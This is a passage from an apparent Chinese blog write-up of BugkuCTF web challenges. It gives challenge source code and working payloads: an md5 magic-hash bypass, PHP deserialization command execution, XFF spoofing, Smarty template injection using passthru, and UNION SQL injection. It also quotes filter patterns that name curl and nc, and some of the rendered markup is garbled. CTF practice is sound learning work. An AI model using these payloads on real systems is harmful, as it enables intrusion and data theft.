class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在进行攻击就可以了，会跑一会，大概四五分钟就可以了。 当<code>Payload</code>为<code>12468</code>的时候返回包的长度是不同的，这个数字很可能就是密码 输入12468，题目返回了flag</p><p><s><strong>flag{003feb2a87a93d430302de9745225ccf}</strong></s></p><h3 id="3-md5">3 md5</h3><p>这个题的话应该是出题人的问题，md5碰撞没给源码…让我想到了当年那道社工题目，社工题目游戏附件里的文件被删了，出题人还不去修复…</p><p>好在评论区有高手啊，在评论区找到了题目的源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$md51</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'QNKCDZO'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$md52</span> <span class="token operator">=</span> @<span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'QNKCDZO'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$md51</span> <span class="token operator">==</span> <span class="token variable">$md52</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"nctf&#123;*****************&#125;"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"false!!!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"please input a"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将<code>QNKCDZO</code>进行<code>md5</code>加密后，发现为0e开头，所以此又有题目的提示，考虑MD5碰撞，就是经过md5加密后以0e开头的在进行‘==’运算时，php会认为他们都为0。</p><p>随便用md5文件解码工具，解码一个0e开头的md5构造<code>payload</code> ：<code>php?a=s1885207154a </code>就能得到flag</p><p><s><strong>flag{1f8ca27b98fec312c275523757fcb967}</strong></s></p><h3 id="4-安慰奖">4 安慰奖</h3><p>打开网页是空白的，查看源码有显示<code>YmFja3Vwcw==</code>是一个base64加密，得到<code>backups</code>备份意思是这个网站应该有备份的php文件泄露，使用御剑扫描后台。有个名叫<code>index.php.bnk</code>的备份，下载下来</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;!-- YmFja3Vwcw== -->"</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctf</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'hack'</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'NULL'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$cmd</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/cat|more|tail|less|head|curl|nc|strings|sort|echo/i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;/br>flag能让你这么容易拿到吗？&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>           <span class="token comment">// echo "&lt;br>right!&lt;br>";</span>            <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string backtick-quoted-string">`$this->cmd`</span><span class="token punctuation">;</span>            <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>给你个安慰奖吧，hhh！&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    <span class="token variable">$select</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span>@<span class="token variable">$select</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。</li><li>与之相反，unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用  __wakeup方法，预先准备对象需要的资源。</li><li>__construct()：PHP 允许开发者在一个类中定义一个方法作为构造函数。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。</li><li>__destruct()：PHP 5 引入了析构函数的概念，这类似于其它面向对象的语言，如 C++。析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</li></ol><p>需要注意的是当访问控制符为private与protect时，序列化时比较特殊：</p><ul><li>protected属性被序列化的时候属性值会变成：%00*%00属性名</li><li>private属性被序列化的时候属性值会变成：%00类名%00属性名</li></ul><p>分析代码</p><p>需要我们上传一个code参数，程序会对其反序列化，当判断username为admin时，会执行cmd内的代码。</p><p>因为调用unserialize函数之前会调用__wakeup方法，后面会将username覆盖为guest。将变量个数修改为大于实际值的数就能够绕过。</p><p>构造：O:3:“ctf”:3:{s:11:&quot;%00*%00username&quot;;s:5:“admin”;s:6:&quot;%00*%00cmd&quot;;s:2:“ls”;}</p><p>使用tac指令读取：O:3:“ctf”:3:{s:11:&quot;%00*%00username&quot;;s:5:“admin”;s:6:&quot;%00*%00cmd&quot;;s:12:“tac flag.php”;}</p><p><strong><s>flag{Unser1alize_and_2CE_Add}</s></strong></p><h3 id="5-程序员本地登录">5 程序员本地登录</h3><p>这个题我好想做了好几次了,我想了一下，这个其实不用burp，在浏览器拦截重发就行，而且他说了本地登录</p><blockquote><p>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段</p></blockquote><p><img src="./BugkuCTF%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95Web%E7%AF%87%5C2.png" alt="2"></p><p>加上<code>X-Forwarded-For: 127.0.0.1</code>就行了。</p><p>得到~~<strong>flag{931ce924403e96daa678573e8f53a1fa}</strong>~~</p><h3 id="6-需要管理员">6 需要管理员</h3><p>打开网页他给我报<code>404 Not Found</code>，使用御剑扫描后台，找到robots.txt打开就行。</p><p><img src="./BugkuCTF%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95Web%E7%AF%87%5C3.png" alt="3"></p><p><code>Disallow: /resusl.php</code>接着打开就行，然后他回显<strong>Warning:你不是管理员你的IP已经被记录到日志了</strong></p><p><img src="./BugkuCTF%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95Web%E7%AF%87%5C4.png" alt="4"></p><p>在下面有回显,<strong>if (<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mrow></mrow><mi>G</mi></msub><mi>E</mi><mi>T</mi><mo stretchy="false">[</mo><mi>x</mi><mo stretchy="false">]</mo><mo>=</mo><mo>=</mo></mrow><annotation encoding="application/x-tex">_GET[x]==</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">G</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mopen">[</span><span class="mord mathdefault">x</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span></span></span>password) <strong>，猜一手password为<code>admin</code>,构造</strong>?x=admin</strong>就的得到了flag</p><p><s><strong>flag{b57e4e59986a3799ed691bd01312686d}</strong></s></p><h3 id="7-变量1">7 变量1</h3><p>打开网址发现一段PHP代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag1.php"</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$args</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/^\w+$/"</span><span class="token punctuation">,</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"args error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"var_dump(<span class="token interpolation"><span class="token variable">$$args</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>**if(isset(<span class='katex-error' title='ParseError: KaTeX parse error: Undefined control sequence: \w at position 53: …!preg_match(&quot;/^\̲w̲+'>_GET[&#039;args&#039;]))**要求我们通过get方法传参，同时**if(!preg_match(&quot;/^\w+</span>/&quot;,<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>r</mi><mi>g</mi><mi>s</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>∗</mo><mo>∗</mo><mtext>这一句代码我们可以知道他把  大小写字母和数字  </mtext><mo separator="true">,</mo><mtext>的全部过滤了。</mtext></mrow><annotation encoding="application/x-tex">args))**这一句代码我们可以知道他把~~大小写字母和数字~~,的全部过滤了。</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">s</span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord">∗</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">句</span><span class="mord cjk_fallback">代</span><span class="mord cjk_fallback">码</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">知</span><span class="mord cjk_fallback">道</span><span class="mord cjk_fallback">他</span><span class="mord cjk_fallback">把</span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mord cjk_fallback">大</span><span class="mord cjk_fallback">小</span><span class="mord cjk_fallback">写</span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">母</span><span class="mord cjk_fallback">和</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">字</span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">全</span><span class="mord cjk_fallback">部</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">滤</span><span class="mord cjk_fallback">了</span><span class="mord cjk_fallback">。</span></span></span></span>$args说明了这个应该是个数组，传一个超全局变量GLOBALS就能得到flag</p><blockquote><p>构造的pload ：<a href="http://114.67.246.176:11080/?args=GLOBALS">http://114.67.246.176:11080/?args=GLOBALS</a></p></blockquote><p><img src="./BugkuCTF%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95Web%E7%AF%87%5C5.png" alt="1634979258452"></p><p>关于PHP的超全局变量找了<a href="https://blog.csdn.net/weixin_33918357/article/details/91536217">一篇博客</a></p><h3 id="8-前女友">8 前女友</h3><p><img src="./BugkuCTF%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95Web%E7%AF%87%5C6.png" alt="6"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v1</span> <span class="token operator">!=</span> <span class="token variable">$v2</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span> <span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到md5，和==符号就想到了PHP的弱类型。</p><pre class="line-numbers language-none"><code class="language-none">构造: index.php?v1[]&#x3D;QLTHNDT&amp;v2[]&#x3D;UTIPEZQ&amp;v3[]&#x3D;EEIZDOI<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>MD5是不能处理数组的，md5(数组)会返回null，所以md5(a[])==null,md5(b[])==null，md5(a[])=md5(b[])=null,这样也可以得到答案了。</p><pre class="line-numbers language-none"><code class="language-none">构造: index.php?v1[]&#x3D;1&amp;v2[]&#x3D;2&amp;v3[]&#x3D;3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到<strong>flag{64608b793996e7d5ea23984c5dd17e77}</strong></p><h3 id="9-聪明的php">9 聪明的php</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./libs/Smarty.class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"pass a parameter and maybe the flag file's filename is random :>"</span><span class="token punctuation">;</span><span class="token variable">$smarty</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Smarty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">AS</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span><span class="token keyword">print</span> <span class="token variable">$key</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|\/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                        <span class="token variable">$smarty</span><span class="token operator">-></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./template.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>     <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/system|readfile|gz|exec|eval|cat|assert|file|fgets/i"</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$smarty</span><span class="token operator">-></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./template.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>     <span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$smarty</span><span class="token operator">-></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"eval:"</span><span class="token operator">.</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>system|readfile|gz|exec|eval|cat|assert|file|fgets这些函数被过滤掉了,**passthru()**函数没有被过滤可以使用。</p><p>构造**?a={passthru(“ls -al /”)}**</p><p><img src="./BugkuCTF%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95Web%E7%AF%87%5C7.png" alt="1634980934909"></p><blockquote><p>构造payload： /index.php?f={fread(fopen(&quot;/_23682&quot;,“r”),4096)}</p></blockquote><h3 id="10-学生成绩查询">10  学生成绩查询</h3><p>典型的<code>sql注入</code>,我还是喜欢手动注入，使用<code>sqlmap</code>更简单，但是多动动手肯定没大事。</p><pre class="line-numbers language-none"><code class="language-none">id&#x3D;a&#39; union select 1,2,3,4#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">id&#x3D;a&#39; union select 1,2,3,database()#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="./BugkuCTF%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95Web%E7%AF%87%5C8.png" alt="8"></p><p>得到数据库为skctf，在使用查询语句，查询表名</p><p><code>id=a; union select 1,2,3,concat(column_name) from information_schema.columns where table_name='fl4g'</code></p><p><img src="./BugkuCTF%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95Web%E7%AF%87%5C9.png" alt="9"></p><p><code>id=a' union select 1,2,3,concat(column_name) from information_schema.columns where table_name='fl4g'</code>确定列名为<strong>skctf_flag</strong></p><p>继续注入<code>id=a' union select 1,2,3,concat(column_name) from information_schema.columns where table_name='fl4g' #</code>得到<strong>flag{ceea3e18163b989ab469f6b2ad7bec22}</strong></p><h3 id="11-秋名山车神">11 秋名山车神</h3><p>亲请在2s内计算老司机的车速是多少</p><p>1213033684-39909826-1331751592-916805948 *  50919270+831329677-2067628447 *  306216988*695768212-91423220+1902912207=?;</p><p>刷新了一下确定这个是会不断改变的，还是写一个脚本解决吧，这个题目可不是人手能算的。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> requestss<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token operator">=</span>s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://114.67.246.176:18683/"</span><span class="token punctuation">)</span>searchObj<span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'^&lt;div>(.*)=\?;&lt;/div>$'</span><span class="token punctuation">,</span>r<span class="token punctuation">.</span>text<span class="token punctuation">,</span>re<span class="token punctuation">.</span>M <span class="token operator">|</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>d<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">"value"</span><span class="token punctuation">:</span><span class="token builtin">eval</span><span class="token punctuation">(</span>searchObj<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>r<span class="token operator">=</span>s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://114.67.246.176:18683/"</span><span class="token punctuation">,</span>data<span class="token operator">=</span>d<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="12-速度要快">12 速度要快</h3><p>使用<strong>Firefox</strong>打开题目网址，在F12下有个**flag：**这个是通过base64加密的产物，通过base64解码。得到</p><blockquote><p>6LeR55qE6L+Y5LiN6ZSZ77yM57uZ5L2gZmxhZ+WQpzogTkRZNE9EST0=</p></blockquote><p><strong><s>NDY4ODI=</s><strong>解码得到</strong>46882</strong>,传一下，然后他骂我…</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">import requestsimport base64url <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token string single-quoted-string">'http://123.206.87.240:8002/web6/'</span><span class="token string single-quoted-string">''</span>header <span class="token operator">=</span> requests<span class="token operator">.</span><span class="token function">get</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token operator">.</span>headerskey <span class="token operator">=</span> base64<span class="token operator">.</span><span class="token function">b64decode</span><span class="token punctuation">(</span>base64<span class="token operator">.</span><span class="token function">b64decode</span><span class="token punctuation">(</span>header<span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string single-quoted-string">':'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>phpsessid <span class="token operator">=</span> header<span class="token punctuation">[</span><span class="token string single-quoted-string">'Set-Cookie'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'='</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>post <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'margin'</span><span class="token punctuation">:</span>key<span class="token punctuation">&#125;</span>cookie <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'PHPSESSID'</span><span class="token punctuation">:</span>phpsessid<span class="token punctuation">&#125;</span><span class="token keyword">print</span><span class="token punctuation">(</span>requests<span class="token operator">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data <span class="token operator">=</span> post<span class="token punctuation">,</span> cookies <span class="token operator">=</span> cookie<span class="token punctuation">)</span><span class="token operator">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用python脚本解码，并传参得到flag。</p><h3 id="13-社工-伪造">13 社工 伪造</h3><p>这道题我不想多说,改QQ名这件事当真离谱…</p><p><img src="./BugkuCTF%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95Web%E7%AF%87%5C10.png" alt="1634986224287"></p><h3 id="14-cookie">14 cookie</h3><blockquote><p>描述: 